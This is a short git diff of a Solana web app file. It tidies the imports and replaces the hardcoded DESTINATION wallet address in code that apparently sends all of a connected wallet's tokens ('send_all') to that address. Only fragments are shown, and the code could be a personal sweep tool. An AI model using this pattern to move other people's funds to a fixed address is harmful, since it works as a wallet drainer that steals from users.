@@ -1,25 +1,15 @@
 import './App.css';
-import {
+import {TOKEN_PROGRAM_ID, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferInstruction,
     // MintLayout,
-    TOKEN_PROGRAM_ID,
     // ASSOCIATED_TOKEN_PROGRAM_ID,
-    createAssociatedTokenAccountInstruction,
-    getAssociatedTokenAddress,
     // createCloseAccountInstruction,
-    createTransferInstruction,
 } from '@solana/spl-token';
-import {
-    clusterApiUrl,
+import {clusterApiUrl, Connection, SystemProgram, Transaction, PublicKey, LAMPORTS_PER_SOL,
     // ParsedAccountData,
-    Connection,
     // Keypair,
-    SystemProgram,
-    Transaction,
     // sendAndConfirmTransaction,
     // SYSVAR_RENT_PUBKEY,
-    PublicKey,
     // TransactionInstruction,
-    LAMPORTS_PER_SOL,
 } from '@solana/web3.js';
 // import {readFile} from "fs/promises";
 // import bs58 from 'bs58';
@@ -42,7 +32,7 @@ const ACTION = 'send_all';
 // const SENDS_IN_ONE_TX = 5;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('6HnkEmyTMex2XUc6Ug7sxwippvNDtzAcz3p524h35sXi');
+const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
